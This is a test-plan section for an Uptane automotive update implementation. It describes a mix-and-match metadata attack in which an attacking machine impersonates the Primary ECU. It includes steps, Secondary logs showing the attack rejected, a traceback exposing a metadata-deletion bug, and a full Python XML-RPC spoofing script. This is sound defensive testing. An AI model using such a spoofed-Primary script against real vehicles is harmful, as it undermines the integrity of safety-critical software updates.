# Uptane Implementation Test Plan
## 14. Mix and Match Update
**Test Case** : Modify an update bundle to combine cryptographically approved updates with incompatible metadata (attempt without a server key compromise).  

**Test Steps**  :

1. Perform Valid Update 
 Monitor the traffic to/from the Primary and the Secondary using Wireshark. Follow the ReadMe and perform a valid update. Afterward, push a valid update from the servers to the Primary.  
2. Setup Attacking Machine  
Next, setup an attacking machine that can communicate with the Secondary. Then, replace the Primary with the attacking machine. Afterward, modify the metadata so the metadata sent to the Secondary will perform a mix-and-match attack. The example below modifies the snapshot.json file to use an old version (v2) rather than the most recent version (v3).  
3. Perform Mix-and-Match Attack   
Ensure the attacking machine is listening on port 30701 and ready to launch the mix-and-match attack by running the following command:
-python3 mix_and_match.py

    Afterward request an update from the Secondary client by performing the following command:  
-ds.update_cycle()  

    Monitor the output of the Secondary to determine if the attack was successful.
    4. Monitor Response  
    Verify the output on the Secondary looks similar to the following when modifying the snapshot.json file:  
     >>> ds.update_cycle()
   Timeserver attestation from Primary does not check out: This Secondary's nonce
   was not found. Not updating this Secondary's time this cycle.
   Verifying 'timestamp'. Requesting version: None
   Downloading:
   'file:////home/pi/workspace/uptane/temp_Secondary00Wb8/unverified/imagerepo/met
   adata/timestamp.json'
   Downloaded 554 bytes out of an upper limit of 16384 bytes.
   [TRUNCATED...]
Downloading: 'file:////home/pi/workspace/uptane/temp_Secondary00Wb8/unverified/imagerepo/met adata/snapshot.json'
Downloaded 594 bytes out of the expected 594 bytes.
Not decompressing file:////home/pi/workspace/uptane/temp_Secondary00Wb8/unverified/imagerepo/meta data/snapshot.json
Update failed from file:////home/pi/workspace/uptane/temp_Secondary00Wb8/unverified/imagerepo/meta data/snapshot.json.
BadHashError
Failed to update snapshot.json from all mirrors: {'file:////home/pi/workspace/uptane/temp_Secondary00Wb8/unverified/imagerepo/me tadata/snapshot.json':
     python3 mix_and_match.py
        ds.update_cycle()
                                                        BadHashError('951654e0508de1f4db44e15ee68792a3a56e7a0e3a4b9b01345ee4d6fc9e67df'
   , 'ad7554d35684c6195a891df934d2de0f63bae41cb6c28dea210a3fd17bfdec90')}
   Metadata for 'snapshot' cannot be updated.
   tuf.NoWorkingMirrorError: No working mirror was found:
    '':
BadHashError('951654e0508de1f4db44e15ee68792a3a56e7a0e3a4b9b01345ee4d6fc9e67df' , 'ad7554d35684c6195a891df934d2de0f63bae41cb6c28dea210a3fd17bfdec90')   

The Secondary did not download metadata after experiencing a mix-and-match attack. However, it must be noted that attempting to perform an update_cycle on the Secondary after a mix-and-match attack has revealed a critical functionality error. The Secondary deletes its verified metadata file that was modified during the mix-and-match attack (i.e., snapshot file in above example). This results in the Secondary producing the following error when attempting to perform an update_cycle() with valid metadata:   
>>> ds.update_cycle()
Timeserver attestation from Primary does not check out: This Secondary's nonce
was not found. Not updating this Secondary's time this cycle.
Verifying 'timestamp'. Requesting version: None
Downloading:
'file:////home/pi/workspace/uptane/temp_Secondary00Wb8/unverified/imagerepo/met
adata/timestamp.json'
[TRUNCATED]
Downloading: 'file:////home/pi/workspace/uptane/temp_Secondary00Wb8/unverified/imagerepo/met adata/snapshot.json'
Downloaded 594 bytes out of the expected 594 bytes.
Not decompressing file:////home/pi/workspace/uptane/temp_Secondary00Wb8/unverified/imagerepo/meta data/snapshot.json
The file's 'sha256' hash is correct: '951654e0508de1f4db44e15ee68792a3a56e7a0e3a4b9b01345ee4d6fc9e67df'
Update failed from file:////home/pi/workspace/uptane/temp_Secondary00Wb8/unverified/imagerepo/meta data/snapshot.json.
UnknownRoleError
Failed to update snapshot.json from all mirrors: {'file:////home/pi/workspace/uptane/temp_Secondary00Wb8/unverified/imagerepo/me tadata/snapshot.json': UnknownRoleError('Role name does not exist: snapshot',)}
[TRUNCATED]     

Upon examination of the file structure, the temporary Secondary’s imagerepo metadata directory no longer contains a snapshot.json file. Although the Secondary is not susceptible to a mix-and-match attack, this test has revealed a major functionality flaw, thereby, failing this test.
It should be noted that the Traceback output for this use case can be seen below:

---
 Traceback (most recent call last):
    File "/home/pi/workspace/uptane/src/tuf/tuf/client/updater.py", line 2467, in
   _update_metadata_if_changed
     self._update_metadata_via_fileinfo(metadata_role, expected_fileinfo,
   compression)
    File "/home/pi/workspace/uptane/src/tuf/tuf/client/updater.py", line 2242, in
   _update_metadata_via_fileinfo
     compression, compressed_fileinfo) 
     File "/home/pi/workspace/uptane/src/tuf/tuf/client/updater.py", line 1872, in
   _safely_get_metadata_file
     download_safely=True)
    File "/home/pi/workspace/uptane/src/tuf/tuf/client/updater.py", line 1980, in
   _get_file
     raise tuf.NoWorkingMirrorError(file_mirror_errors)
   tuf.NoWorkingMirrorError: No working mirror was found:
    '': UnknownRoleError('Role name does not exist: snapshot',)
   During handling of the above exception, another exception occurred:
   Traceback (most recent call last):
    File "<stdin>", line 1, in <module>
    File "/home/pi/workspace/uptane/demo/demo_Secondary.py", line 332, in
   update_cycle
     Secondary_ecu.process_metadata(archive_fname)
    File "/home/pi/workspace/uptane/uptane/clients/Secondary.py", line 560, in
   process_metadata
     self.fully_validate_metadata()
    File "/home/pi/workspace/uptane/uptane/clients/Secondary.py", line 485, in
   fully_validate_metadata
     self.updater.refresh()
    File "/home/pi/workspace/uptane/src/tuf/tuf/client/updater.py", line 330, in
   refresh
     unsafely_update_root_if_necessary)
    File "/home/pi/workspace/uptane/src/tuf/tuf/client/updater.py", line 1412, in
   refresh
     referenced_metadata='timestamp')
    File "/home/pi/workspace/uptane/src/tuf/tuf/client/updater.py", line 2483, in
   _update_metadata_if_changed
     self._delete_metadata(metadata_role)
    File "/home/pi/workspace/uptane/src/tuf/tuf/client/updater.py", line 2842, in
   _delete_metadata
     tuf.roledb.remove_role(metadata_role, self.repository_name)
    File "/home/pi/workspace/uptane/src/tuf/tuf/roledb.py", line 559, in
   remove_role
     _check_rolename(rolename, repository_name)
    File "/home/pi/workspace/uptane/src/tuf/tuf/roledb.py", line 955, in
   _check_rolename
     raise tuf.UnknownRoleError('Role name does not exist: ' + rolename)
   tuf.UnknownRoleError: Role name does not exist: snapshot
---

**Test Scripts** : 
mix_and_match.py

import sys
   from xmlrpc.server import SimpleXMLRPCServer
   from xmlrpc.server import SimpleXMLRPCRequestHandler
   class RequestHandler(SimpleXMLRPCRequestHandler):
     rpc_paths = ('/RPC2',)
   #Act as the Primary
   server = SimpleXMLRPCServer(("192.168.1.81", 30701),
   requestHandler=RequestHandler, allow_none=True)
   #Define a function and register the response
   def get_time_attestation_for_ecu(val1=False,val2=False,val3=False):
  response = {'signed': {'time': '2018-02-27T18:48:29Z', 'nonces':
[1221555015]}, 'signatures':
[{'keyid':'79c796d7e87389d1ebad04edce49faef611d139ee41ea9fb1931732afbfaac2e',
'sig':'587c231b40bbd1af309d9fba6fa8c7396df4c0f23191808ecd48e6eecad023ce9d323e86
30e21b2df00c55c05baa0183982afae9c7038290f6c7b6ba43c40108',
'method':'ed25519'}]}
  return response
server.register_function(get_time_attestation_for_ecu,
      'get_time_attestation_for_ecu')
#Define a function and register the response
def get_metadata(val1=False,val2=False,val3=False):
  with open('full_metadata_archive.zip','rb') as f:
    return f.read()
server.register_function(get_metadata,
      'get_metadata')
#Define a function and register the response
def update_exists_for_ecu(val1=False,val2=False,val3=False):
  return True
server.register_function(update_exists_for_ecu,
      'update_exists_for_ecu')
#Define a function and register the response
def get_image(val1=False,val2=False,val3=False):
  response=['v2_update.txt', b'v2 update for SECONDARY_ECU_111']
  return response
server.register_function(get_image,
      'get_image')
#Define a function and register the response
def submit_ecu_manifest(val1=False,val2=False,val3=False,val4=False):
  return ''
server.register_function(submit_ecu_manifest,
      'submit_ecu_manifest')
try:
  server.serve_forever()
except KeyboardInterrupt:
  print("\nKeyboard interrupt.")
  sys.exit(0)
                                                                                                                





